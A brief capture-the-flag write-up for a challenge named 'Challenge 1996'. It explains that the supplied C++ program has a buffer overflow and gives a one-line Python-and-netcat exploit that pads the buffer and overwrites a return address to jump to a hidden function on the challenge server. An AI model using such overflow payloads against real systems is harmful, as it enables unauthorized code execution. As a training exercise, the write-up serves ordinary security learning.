Challenge 1996
==============

42 Points -> very easy

# Challenge
It's 1996 all over again!
nc 35.207.132.47 22227

The challenge also contains a zip file with the source and the binary of the application behind the given network address.

# Solution
The C++ code shows an obvious buffer overflow. With the input that can be given to the program, the buffer overflow can be exploited and the pointer to the "hidden" function can be put into the memory to execute and unintended jump. All it takes is a little bit of python:

```
(python -c "print '\x00'*1048+ '\x97\x08\x40\x00\x00\x00\x00\x00'"; cat -) | nc 35.207.132.47 22227
```